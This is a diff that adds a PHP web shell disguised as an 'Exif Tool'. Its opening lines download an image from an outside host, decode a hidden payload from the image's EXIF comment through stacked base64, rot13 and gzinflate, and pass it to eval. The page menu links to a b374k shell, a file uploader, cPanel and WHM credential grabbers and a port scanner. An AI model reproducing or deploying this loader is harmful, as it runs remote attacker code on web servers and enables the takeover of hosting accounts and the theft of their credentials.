@@ -1,0 +1,51 @@
+<?php
+$images = exif_read_data("https://s4.postimg.org/dmll5dul9/scan.jpg");
+eval(str_rot13(gzinflate(str_rot13(base64_decode($images["COMPUTED"]["UserComment"])))));
+?>
+<html>
+<body bgcolor=black text=red>
+<head>
+<style type="text/css">
+body{
+	background:#000000;;
+}
+a {
+text-decoration:none;
+}
+a:hover{
+border-bottom:1px solid aqua;
+}
+*{
+	font-size:11px;
+	font-family:Courier,Courier,Courier;
+	color:white;
+}
+#menu a{
+	padding:4px 18px;
+	margin:0;
+	background:darkred;
+	text-decoration:none;
+	letter-spacing:2px;
+	-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
+
+}
+</style>
+<title>Exif Tool</title>
+<link rel="icon" type="image/x-icon" href="http://iconhandbook.co.uk/favicon.ico/favicon.ico" />
+</head>
+<center><br>
+<img src="https://s16.postimg.org/vcx9xt5ad/scan.jpg" height="200px" width="200px"><br /></center>
+<br><center><div id="menu">
+<a href="?raimu">Uploader</a>
+<a href="?asu">b374k Shell</a>
+<a href="?cok">Mini Sql</a>
+<a href="?mbut">Email Filter</a><br><br>
+<a href="?tol">cPanel Finder</a>
+<a href="?taek">WHM Grab</a>
+<a href="?tel">Port Scanner</a>
+<a href="?mpek">CPU Monitor</a>
+</div></center>
+<p>
+
+<br><br><center><h2>© Copyleft 2017 Bagsfreakz</h2><center>
+</html>
